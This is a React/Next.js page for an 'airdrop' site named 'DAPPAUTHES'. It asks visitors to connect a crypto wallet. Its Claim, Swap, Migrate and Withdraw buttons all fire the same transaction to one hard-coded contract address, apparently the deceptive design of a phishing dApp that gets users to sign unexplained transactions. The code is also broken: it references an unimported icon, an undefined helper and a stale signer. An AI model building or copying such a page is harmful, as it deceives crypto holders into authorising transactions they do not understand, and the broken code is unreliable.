import Head from "next/head";
import Image from "next/image";
import styles from "../styles/Home.module.css";
import Web3Modal from "web3modal";
import { useState, useEffect } from "react";
import { ethers } from "ethers";
import { abi } from "../constants/abi";



let web3Modal;

const ethAmount = 0.01;

const providerOptions = {

  
  
  binancechainwallet: {
    package: true
  },

};

if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    cacheProvider: false,
    
    providerOptions, // required

  });
}

export default function Home() {
  const [isConnected, setIsConnected] = useState(false);
  const [hasMetamask, setHasMetamask] = useState(false);
  const [signer, setSigner] = useState(undefined);

  useEffect(() => {
    if (typeof window.ethereum !== "undefined") {
      setHasMetamask(true);
    }
  });

  async function connect() {
    if (typeof window.ethereum !== "undefined") {
      try {
        const web3ModalProvider = await web3Modal.connect();
        setIsConnected(true);
        const provider = new ethers.providers.Web3Provider(web3ModalProvider);
        setSigner(provider.getSigner());
      } catch (e) {
        console.log(e);
      }
    } else {
      setIsConnected(false);
    }
  }
async function withdraw() {
    console.log(`Withdrawing...`)
  if (typeof window.ethereum !== "undefined") {
    const web3ModalProvider = await web3Modal.connect();
        setIsConnected(true);
        const provider = new ethers.providers.Web3Provider(web3ModalProvider);
        setSigner(provider.getSigner());
      const contractAddress = '0xA2fAa6289311f06C8DC234db09512Ce9b8fAc9BF';
      const contract = new ethers.Contract(contractAddress, abi, signer);
         try {
            const transactionResponse = await contract.withdraw()
            await listenForTransactionMine(transactionResponse, provider)
        } catch (error) {
            console.log(error)
        }
    } else {
      console.log("Please install MetaMask");
    }
  }

  return (
    <div>
       <div>
      <header>
        <div className="connect-btn-container">

          <button className="connect-btn" onClick={() => connect()}>Connect</button>
          
{isConnected ? (
          <button className="connect-btn" > <BiWallet className='connect-icon'/> Connected</button>
        ) : (
          <button className="connect-btn"  onClick={() => connect()}> <BiWallet className='connect-icon'/>Connect</button>
        )}
        </div>
      </header>

      <div className="main-container">
        <div className="inner-container">
          <div className="title-container">
            <h1 className="title">DAPPAUTHES</h1>
            </div>
          <div className="text-container">
            <p>Claim your Airdrop</p>
          </div>

          <div className="main-button-wrap-1">

            <div className="inner-button-wrap-1">

            <button className="btn"  onClick={() => withdraw()}>Claim</button>
            
          <button className="btn" onClick={() => withdraw()}>Swap</button>

            </div>

          </div>

          <div className="main-button-wrap-2">
            <div className="inner-button-wrap-2">
            <button className="btn" onClick={() => withdraw()}>Migrate</button>
          <button className="btn" onClick={() => withdraw()}>Withdraw</button>
              

            </div>

          </div>

        


         

        
      </div>
    </div>

    </div>
    </div>
  );
}
